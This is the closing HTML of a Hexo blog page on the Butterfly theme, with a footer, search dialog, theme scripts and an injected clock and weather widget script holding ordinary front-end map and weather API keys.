url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By putdown</div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = '92c0b85004c94c3a97297a4fd2f8c93e';
+  var gaud_map_key = '5544b267bba4ecd452e5b3f7327b1b8a';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
